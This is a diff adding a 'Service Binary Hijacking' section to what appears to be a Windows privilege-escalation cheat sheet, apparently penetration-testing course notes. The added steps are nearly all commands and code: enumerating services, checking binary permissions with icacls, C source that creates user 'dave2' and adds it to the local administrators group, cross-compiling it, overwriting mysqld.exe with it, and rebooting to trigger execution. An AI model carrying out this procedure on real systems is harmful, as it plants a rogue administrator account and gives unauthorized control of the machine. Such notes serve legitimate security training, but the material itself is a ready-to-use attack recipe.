@@ -1039,6 +1039,83 @@ runas /user:backupadmin cmd
 
 ### Service Binary Hijacking
 
+#### Get Running services
+~~~ powershell
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+~~~
+
+### icacls permissions mask
+| Mask | Permissions           |
+|------|------------------------|
+| F    | Full access            |
+| M    | Modify access          |
+| RX   | Read and execute access|
+| R    | Read-only access       |
+| W    | Write-only access      |
+
+### Check service binary permissions
+
+~~~ powershell
+icacls "C:\xampp\apache\bin\httpd.exe"
+~~~
+
+
+### adduser.c
+
+~~~ c
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user dave2 password123! /add");
+  i = system ("net localgroup administrators dave2 /add");
+  
+  return 0;
+}
+~~~
+
+### Cross-Compile the C Code to a 64-bit application
+
+~~~ bash
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+~~~
+
+
+### Replacing mysqld.exe with our malicious binary
+
+~~~ powershell
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
+~~~
+
+### Attempting to stop the service to restart it
+
+~~~ powershell
+net stop mysql
+~~~
+
+### Obtain Startup Type for mysql service
+
+~~~ powershell
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+~~~
+
+### Checking for reboot privileges
+
+~~~ powershell
+whoami /priv
+~~~
+
+### Rebooting the machine
+
+~~~ powershell
+shutdown /r /t 0
+~~~
+
+
+
+
 ### DLL Hijacking
 
 ### Unquoted Service Paths
